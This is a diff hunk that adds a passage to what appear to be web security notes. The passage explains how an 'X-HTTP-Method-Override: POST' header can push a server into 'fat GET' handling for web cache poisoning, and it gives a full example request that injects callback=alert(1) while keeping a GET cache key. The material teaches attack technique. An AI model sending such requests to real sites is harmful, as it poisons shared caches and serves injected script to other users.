@@ -281,3 +281,15 @@ X-Cache: hit
 alert(1)({"country":"United Kingdom"});
 ```
 In this case, the cache key would be based on the request line, but the server-side value of the parameter would be taken from the body.
+<br>
+<br>
+Sometimes we can encourage "fat GET" handling by overriding the HTTP method via ```X-HTTP-Method-Override: POST``` header, for example:
+```
+GET /js/geolocate.js?callback=setCountryCookie HTTP/2
+Host: test.com
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
+X-HTTP-Method-Override: POST
+
+callback=alert(1)
+```
+As long as the ```X-HTTP-Method-Override``` header is unkeyed, you could submit a pseudo-POST request while preserving a GET cache key derived from the request line.
